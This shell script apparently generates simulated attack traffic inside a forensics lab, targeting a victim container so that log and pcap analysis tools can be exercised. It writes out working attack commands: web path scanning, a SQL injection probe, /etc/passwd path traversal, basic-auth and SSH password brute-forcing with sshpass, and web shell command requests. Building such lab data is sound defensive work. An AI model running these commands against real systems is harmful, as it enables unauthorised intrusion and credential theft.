#!/bin/sh
# Run from the c2 container: noisy attacker activity against the victim (10.10.40.20) that ends
# up in its logs and in the pcap Live-Forensicator records with -p.
V=10.10.40.20
echo "[recon] web scanning with tool user-agents"
for p in / /admin /wp-login.php /.env /.git/config /phpmyadmin/ /server-status /uploads/; do
  curl -s -o /dev/null -A "Mozilla/5.00 (Nikto/2.5.0)" "http://$V$p"
done
curl -s -o /dev/null -A "sqlmap/1.8" "http://$V/index.php?id=1%27%20OR%20%271%27=%271"
curl -s -o /dev/null "http://$V/index.php?page=../../../../etc/passwd"
echo "[creds] HTTP basic-auth guesses against /admin/ (cleartext - BruteShark will recover them)"
for pw in admin Spring2026 Welcome1; do curl -s -o /dev/null -u "admin:$pw" "http://$V/admin/"; done

echo "[brute] 12 failed SSH logins, then a success with the stolen deploy password"
for pw in admin 123456 password root toor letmein qwerty welcome changeme summer2026 P@ssw0rd deploy; do
  sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 deploy@$V true 2>/dev/null
done
sshpass -p 'Deploy#2026' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@$V 'id; uname -a' 2>/dev/null

echo "[shell] web shell requests"
for c in id whoami "cat%20/etc/passwd" "uname%20-a"; do
  curl -s -o /dev/null "http://$V/uploads/shell.php?cmd=$c"
done
echo "[done] attack traffic sent"
